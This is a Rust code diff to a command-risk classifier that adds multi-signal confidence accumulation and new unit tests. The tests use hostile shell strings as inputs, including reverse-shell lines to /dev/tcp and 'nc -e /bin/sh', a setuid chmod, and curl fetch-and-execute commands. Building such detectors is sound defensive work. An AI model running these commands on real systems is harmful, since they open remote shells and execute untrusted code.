@@ -90,45 +90,136 @@ impl Classifier {
     }
 
     pub fn classify(&self, command: &str) -> ClassifyResult {
-        // V2-H: Tier-1 returns its verdict + the byte-offset of
-        // the match. The offset feeds the Tier-2 sliding-context-
-        // window when we decide to second-stage the verdict.
-        if let Some((mut hit, offset)) = self.tier1.classify_with_offset(command) {
-            // SLM confirmation: when the Tier-1 hit was the
-            // broad-signal AtomMatcher (confidence < 0.9), ask
-            // the Tier-2 backend with the offset hint. If the
-            // SLM agrees this looks harmful, escalate to Block;
-            // if it disagrees we keep the atom's Warn (the
-            // atom triggered for a reason — don't auto-clear).
-            if hit.confidence < 0.9 {
-                if let Some(slm) = self.tier2.classify(command, Some(offset)) {
-                    if matches!(slm.verdict, Verdict::Block) {
-                        hit.verdict = Verdict::Block;
-                        hit.confidence = slm.confidence.max(hit.confidence);
-                        hit.reason = format!("{} — confirmed by Tier-2 {}", hit.reason, self.tier2.name());
-                    }
-                }
+        // V2-J: threat-level accumulator. Collect ALL Tier-1 hits
+        // (multi-atom + multi-URL + each regex layer's verdict),
+        // combine their confidences via independent-probability
+        // math, optionally second-stage with Tier-2 SLM, then map
+        // the accumulated score to a verdict.
+        //
+        // The old "first match wins" path is preserved as
+        // `Tier1::classify_with_offset` for tests + any caller
+        // that explicitly wants a single representative hit.
+        let mut hits = self.tier1.classify_all(command);
+        let tier1_combined = combined_confidence(&hits);
+
+        // Tier-2 dispatch policy:
+        //   - Below the SLM-confirm threshold (0.9): ask the SLM,
+        //     because either we have a Tier-1 signal that needs
+        //     confirmation OR we have no Tier-1 signal and want
+        //     the SLM to look fresh on the whole command.
+        //   - At or above 0.9 already from Tier-1 alone: skip the
+        //     SLM. Its ~50 ms cost buys nothing when we already
+        //     have enough signal to flag.
+        // The hint is the EARLIEST Tier-1 offset — gives the
+        // SLM's sliding-context-window the most leading context.
+        //
+        // V2-J semantic shift vs pre-PR: previously the SLM result
+        // ONLY upgraded a Tier-1 hit when its verdict was `Block`.
+        // Now any SLM hit at any verdict contributes its
+        // confidence to the accumulator — a Heuristic at 0.7
+        // combined with one atom at 0.6 reaches 0.88, where the
+        // old code would have stayed at 0.6. This is intentional:
+        // the accumulator's value is in its symmetry across
+        // tiers, and the verdict still surfaces from the primary
+        // (highest-confidence) hit.
+        if tier1_combined < SLM_CONFIRM_THRESHOLD {
+            let hint = hits.iter().map(|(_, off)| *off).min();
+            if let Some(slm) = self.tier2.classify(command, hint) {
+                hits.push((slm, hint.unwrap_or(0)));
             }
-            return hit;
         }
-        // No Tier-1 hit. Try Tier-2 with no hint (whole-command
-        // classification — useful for the HeuristicBackend's
-        // additional regex rules and for Onnx-driven anomaly
-        // detection on commands the curated Tier-1 list missed).
-        if let Some(hit) = self.tier2.classify(command, None) {
-            return hit;
-        }
-        // Default Safe response — daemon side, no Tier-1 hit, no
-        // Tier-2 hit. Caller (server::dispatch) may still upgrade
-        // based on the PID threat map.
-        ClassifyResult {
+
+        combine_hits(&hits).unwrap_or(ClassifyResult {
             verdict: Verdict::Safe,
             category: Category::None,
             confidence: 0.0,
             reason: String::new(),
             matched: String::new(),
-        }
+        })
     }
+}
+
+/// V2-J accumulator thresholds.
+///
+/// `WARN_THRESHOLD` — the combined confidence at or above which
+/// the classifier reports a `Warn` verdict (banner prompts user
+/// [y]/[t]/cancel). Anything below this is `Safe`. A single atom
+/// hit (0.6) crosses this on its own — matches the pre-V2-J
+/// "any atom → Warn" semantics.
+///
+/// `SLM_CONFIRM_THRESHOLD` — combined Tier-1 confidence below
+/// which we ASK the Tier-2 SLM for a second opinion. Above this
+/// we skip the SLM (we've already accumulated strong-enough
+/// signal that the ~50 ms SLM cost buys nothing).
+///
+/// Note: no auto-`Block` threshold in Phase 1. Block is "hard
+/// refuse, no prompt" per `protocol::Verdict::Block`; escalating
+/// curl|sh / flagged_url / npm hits from prompt-the-user to
+/// auto-refuse is a user-visible policy change deferred to a
+/// future PR with a config knob. Today's accumulator boosts the
+/// confidence NUMBER (visible in the banner + trust-cache keys)
+/// while keeping the verdict at Warn.
+const WARN_THRESHOLD: f32 = 0.5;
+const SLM_CONFIRM_THRESHOLD: f32 = 0.9;
+
+/// Combine N hits' confidences via the independent-probability
+/// model: `p_combined = 1 - prod(1 - p_i)`. Treats each hit as an
+/// independent "this command is harmful" indicator. Saturates
+/// toward 1.0 as more hits accumulate; a single hit returns its
+/// own confidence unchanged.
+fn combined_confidence(hits: &[(ClassifyResult, usize)]) -> f32 {
+    if hits.is_empty() {
+        return 0.0;
+    }
+    1.0 - hits.iter().fold(1.0f32, |acc, (h, _)| acc * (1.0 - h.confidence))
+}
+
+/// Map an accumulated hit list to a single `ClassifyResult`.
+/// Returns None when the combined confidence is below the Warn
+/// threshold — callers default to Safe in that case.
+///
+/// The output's `category` + `matched` come from the highest-
+/// confidence hit (the "primary" signal); `reason` concatenates
+/// every hit's reason so the banner UI can show "3 signals fired"
+/// detail without losing the per-hit attribution.
+fn combine_hits(hits: &[(ClassifyResult, usize)]) -> Option<ClassifyResult> {
+    if hits.is_empty() {
+        return None;
+    }
+    let conf = combined_confidence(hits);
+    if conf < WARN_THRESHOLD {
+        return None;
+    }
+    // Primary hit = highest individual confidence. The primary's
+    // VERDICT is what the accumulator surfaces — we don't auto-
+    // escalate a Warn to Block based on multi-hit confidence
+    // (that's a user-visible policy decision deferred to a
+    // future PR). `partial_cmp` can return None on NaN, so
+    // `unwrap_or(Equal)` keeps the iterator deterministic.
+    let primary = hits
+        .iter()
+        .max_by(|a, b| {
+            a.0.confidence
+                .partial_cmp(&b.0.confidence)
+                .unwrap_or(std::cmp::Ordering::Equal)
+        })
+        .map(|(h, _)| h)
+        .expect("hits.is_empty() guarded above");
+    let reason = if hits.len() == 1 {
+        primary.reason.clone()
+    } else {
+        // "N signals fired: <reason1>; <reason2>; ..." — gives the
+        // banner UI per-hit attribution without losing the count.
+        let parts: Vec<String> = hits.iter().map(|(h, _)| h.reason.clone()).collect();
+        format!("{} signals fired: {}", hits.len(), parts.join("; "))
+    };
+    Some(ClassifyResult {
+        verdict: primary.verdict.clone(),
+        category: primary.category.clone(),
+        confidence: conf,
+        reason,
+        matched: primary.matched.clone(),
+    })
 }
 
 // ---------------------------------------------------------------------------
@@ -140,13 +231,12 @@ struct Tier1 {
     bash_c: Regex,
     flagged_npm_packages: Vec<&'static str>,
     flagged_urls: Vec<&'static str>,
-    /// V2-G AtomMatcher — Aho-Corasick scan over the
-    /// data-file-driven atom corpus. Runs FIRST (cheap broad
-    /// signal); precise regex layer runs second (high-confidence
-    /// verdicts). When the V2-J accumulator lands, both layers'
-    /// hits feed into the same score; today the AtomMatcher's
-    /// verdict is medium-confidence Warn while the precise
-    /// layer's verdicts stay high-confidence.
+    /// V2-G AtomMatcher — Aho-Corasick scan over the data-file-
+    /// driven atom corpus. V2-J's accumulator (`classify_all` +
+    /// `combine_hits`) walks ALL atom hits in a command and
+    /// combines their confidences with the regex layers via
+    /// independent-probability math. Atoms stay at 0.6 per hit;
+    /// the precise regex layers stay at 0.9-1.0.
     atom_matcher: crate::atom_matcher::AtomMatcher,
 }
 
@@ -225,49 +315,73 @@ impl Tier1 {
     }
 
     fn classify_with_offset(&self, line: &str) -> Option<(ClassifyResult, usize)> {
-        // Order: precise regex layers FIRST (confidence 0.9-1.0
-        // verdicts), AtomMatcher LAST as broad-signal fallback
-        // (confidence 0.6 Warn). Reverse-order would let the AC
-        // hit on `curl -fsSL` short-circuit the curl_pipe_sh
-        // 1.0-confidence verdict, downgrading the strongest
-        // signal we have. V2-J's accumulator will combine both
-        // tiers into one score; until then, give the high-
-        // confidence rule the right of first refusal.
+        // Convenience wrapper used by tests + callers that want a
+        // single representative hit. Returns the highest-confidence
+        // hit from the full multi-hit walk; the byte-offset comes
+        // from that hit too. Tie-break (Rust stdlib `max_by`
+        // semantics): when two hits share the same confidence, the
+        // LAST one in the layer-emission order wins. Layer order
+        // is curl_pipe_sh → flagged_urls → npm → bash_c → atoms,
+        // so e.g. two 0.9 flagged-URL hits resolve to the second
+        // one. Callers that care about specific offsets should
+        // use `classify_all` directly.
+        let hits = self.classify_all(line);
+        hits.into_iter().max_by(|a, b| {
+            a.0.confidence
+                .partial_cmp(&b.0.confidence)
+                .unwrap_or(std::cmp::Ordering::Equal)
+        })
+    }
+
+    /// V2-J: collect EVERY Tier-1 signal that fired on `line`.
+    /// Each layer contributes at most once (regex layers are
+    /// command-level, not per-pipe-stage) except the AtomMatcher,
+    /// which contributes one entry per non-overlapping AC hit.
+    /// The accumulator in `Classifier::classify` combines these
+    /// into a single verdict via independent-probability math.
+    fn classify_all(&self, line: &str) -> Vec<(ClassifyResult, usize)> {
+        let mut hits: Vec<(ClassifyResult, usize)> = Vec::new();
+
         if let Some(m) = self.curl_pipe_sh.find(line) {
-            return Some((ClassifyResult {
-                verdict: Verdict::Warn,
-                category: Category::CurlPipeSh,
-                confidence: 1.0,
-                reason: "remote-fetch-and-execute (`curl … | sh`)".into(),
-                matched: m.as_str().trim().to_owned(),
-            }, m.start()));
+            hits.push((
+                ClassifyResult {
+                    verdict: Verdict::Warn,
+                    category: Category::CurlPipeSh,
+                    confidence: 1.0,
+                    reason: "remote-fetch-and-execute (`curl … | sh`)".into(),
+                    matched: m.as_str().trim().to_owned(),
+                },
+                m.start(),
+            ));
         }
 
         // Flagged-URL fast path. Substring scan — covers fetcher
         // calls AND any other shell shape that bakes the IOC URL
         // into a command (e.g. `xdg-open https://copyfail.security`).
         // Cheap: O(n × m) but n ≈ 200 chars typical, m ≈ 10 entries.
+        // V2-J: collect EVERY flagged URL hit, not just the first —
+        // a command can carry multiple bad URLs and each contributes
+        // to the combined confidence.
         for needle in &self.flagged_urls {
             if let Some(at) = line.find(needle) {
-                // Anchor the matched substring to whitespace-or-EOL
-                // boundaries so the trust-cache hash is stable
-                // across leading/trailing chrome.
                 let end = at + needle.len();
-                return Some((ClassifyResult {
-                    verdict: Verdict::Warn,
-                    category: Category::CurlPipeSh,
-                    confidence: 0.9,
-                    reason: format!(
-                        "`{}` is on the flagged-URLs list (known IOC / exploit-PoC host)",
-                        needle
-                    ),
-                    matched: line[at..end].to_owned(),
-                }, at));
+                hits.push((
+                    ClassifyResult {
+                        verdict: Verdict::Warn,
+                        category: Category::CurlPipeSh,
+                        confidence: 0.9,
+                        reason: format!(
+                            "`{}` is on the flagged-URLs list (known IOC / exploit-PoC host)",
+                            needle
+                        ),
+                        matched: line[at..end].to_owned(),
+                    },
+                    at,
+                ));
             }
         }
 
         if let Some(m) = self.npm_unsafe.find(line) {
-            // Walk tokens after the matched verb to check the bad-pkg list.
             let tail = &line[m.end()..];
             for tok in tail.split_whitespace() {
                 if tok.starts_with('-') {
@@ -278,16 +392,22 @@ impl Tier1 {
                     Some(i) => &tok[..i],
                 };
                 if self.flagged_npm_packages.contains(&name) {
-                    return Some((ClassifyResult {
-                        verdict: Verdict::Warn,
-                        category: Category::NpmUnsafeInstall,
-                        confidence: 1.0,
-                        reason: format!(
-                            "`{}` is on the security_guard flagged-packages list",
-                            name
-                        ),
-                        matched: format!("{}{}", m.as_str().trim(), &line[m.end()..]).trim().to_owned(),
-                    }, m.start()));
+                    hits.push((
+                        ClassifyResult {
+                            verdict: Verdict::Warn,
+                            category: Category::NpmUnsafeInstall,
+                            confidence: 1.0,
+                            reason: format!(
+                                "`{}` is on the security_guard flagged-packages list",
+                                name
+                            ),
+                            matched: format!("{}{}", m.as_str().trim(), &line[m.end()..])
+                                .trim()
+                                .to_owned(),
+                        },
+                        m.start(),
+                    ));
+                    break;
                 }
             }
         }
@@ -301,28 +421,29 @@ impl Tier1 {
                 .unwrap_or("");
             if arg.len() >= 40 && base64_ratio(arg) >= 0.9 {
                 let m = cap.get(0).unwrap();
-                return Some((ClassifyResult {
-                    verdict: Verdict::Warn,
-                    category: Category::BashCBase64,
-                    confidence: 1.0,
-                    reason: "`bash -c` with a long base64-shaped payload".into(),
-                    matched: m.as_str().trim().to_owned(),
-                }, m.start()));
+                hits.push((
+                    ClassifyResult {
+                        verdict: Verdict::Warn,
+                        category: Category::BashCBase64,
+                        confidence: 1.0,
+                        reason: "`bash -c` with a long base64-shaped payload".into(),
+                        matched: m.as_str().trim().to_owned(),
+                    },
+                    m.start(),
+                ));
             }
         }
 
-        // V2-G AtomMatcher fallback. Runs after the precise regex
-        // layers so a high-confidence verdict (curl_pipe_sh = 1.0,
-        // flagged_urls = 0.9, npm_unsafe = 1.0, bash_c_base64 = 1.0)
-        // wins over a broad atom hit. Cheap O(line_len) AC scan
-        // regardless of corpus size. The hit's byte_offset feeds
-        // V2-H's sliding-context-window slicing in Tier-2.
-        if let Some(hit) = self.atom_matcher.find_first(line) {
+        // V2-G/J AtomMatcher: walk EVERY atom hit. With the Sigma +
+        // LOLBAS corpus (#125) a single command can plausibly carry
+        // 2-5 atoms — N atoms at 0.6 combine to `1 - 0.4^N`, which
+        // crosses the Block threshold at N=3 (0.936).
+        for hit in self.atom_matcher.find_all(line) {
             let offset = hit.byte_offset;
-            return Some((self.atom_matcher.hit_to_result(&hit, line), offset));
+            hits.push((self.atom_matcher.hit_to_result(&hit, line), offset));
         }
 
-        None
+        hits
     }
 }
 
@@ -772,6 +893,83 @@ mod tests {
         assert!(matches!(r.verdict, Verdict::Warn));
         assert!(r.confidence < 1.0, "atom hits stay at medium confidence");
         assert!(r.reason.contains("AtomMatcher"));
+    }
+
+    #[test]
+    fn multi_atom_accumulates_confidence() {
+        // V2-J: two distinct atoms in one command combine via
+        // independent-probability math. Two atoms at 0.6 each
+        // accumulate to 1 - 0.4^2 = 0.84.
+        let c = Classifier::new();
+        let r = c.classify("bash -i >& /dev/tcp/10.0.0.1/4444 && nc -e /bin/sh");
+        assert!(matches!(r.verdict, Verdict::Warn));
+        // Combined confidence should be above the single-atom
+        // baseline (0.6) but below the regex-hit ceiling (1.0).
+        assert!(r.confidence > 0.6, "expected >0.6, got {}", r.confidence);
+        assert!(r.confidence < 1.0, "expected <1.0, got {}", r.confidence);
+        // Multi-hit reason has the "N signals fired" prefix.
+        assert!(
+            r.reason.contains("signals fired"),
+            "expected multi-hit reason, got {:?}",
+            r.reason
+        );
+    }
+
+    #[test]
+    fn three_plus_atoms_saturate_toward_one() {
+        // Three atoms: 1 - 0.4^3 = 0.936. Verdict stays Warn
+        // (no auto-Block escalation in V2-J Phase 1) but the
+        // confidence number is now well above the SLM-confirm
+        // threshold, signalling "strong evidence" to the banner.
+        let c = Classifier::new();
+        let r = c.classify(
+            "bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x",
+        );
+        assert!(matches!(r.verdict, Verdict::Warn));
+        assert!(r.confidence > 0.9, "expected >0.9, got {}", r.confidence);
+    }
+
+    #[test]
+    fn slm_contributes_to_accumulator() {
+        // V2-J semantic shift: the Tier-2 SLM's confidence joins
+        // the accumulator regardless of its verdict (pre-V2-J,
+        // only a `Verdict::Block` SLM result was used). Verified
+        // via the HeuristicBackend's proc-substitution rule
+        // (0.85) combined with the `bash <(curl` atom (0.6) →
+        // `1 - (1-0.85)*(1-0.6) = 0.94`.
+        let c = Classifier::new_with_backend(
+            BackendKind::Heuristic,
+            &crate::config::OnnxConfig::default(),
+        );
+        let r = c.classify("bash <(curl -fsSL https://x.com/installer.sh)");
+        assert!(matches!(r.verdict, Verdict::Warn));
+        // Combined should exceed the heuristic's 0.85 alone.
+        assert!(
+            r.confidence > 0.85,
+            "expected SLM+atom combined > 0.85, got {}",
+            r.confidence
+        );
+        // Multi-hit reason carries the "N signals fired" marker.
+        assert!(r.reason.contains("signals fired"));
+    }
+
+    #[test]
+    fn single_hit_preserves_pre_v2j_confidence() {
+        // The accumulator must not change single-hit semantics:
+        // `curl … | sh` still produces confidence 1.0 / Warn /
+        // CurlPipeSh, exactly as the regex-only Tier-1 did.
+        let c = Classifier::new();
+        let r = c.classify("curl https://x.com/install.sh | sh");
+        assert!(matches!(r.verdict, Verdict::Warn));
+        assert!(matches!(r.category, Category::CurlPipeSh));
+        assert!(
+            (r.confidence - 1.0).abs() < f32::EPSILON,
+            "expected 1.0, got {}",
+            r.confidence
+        );
+        // Single-hit reason is the primary's reason verbatim —
+        // no "N signals fired" prefix.
+        assert!(!r.reason.contains("signals fired"));
     }
 
     #[test]
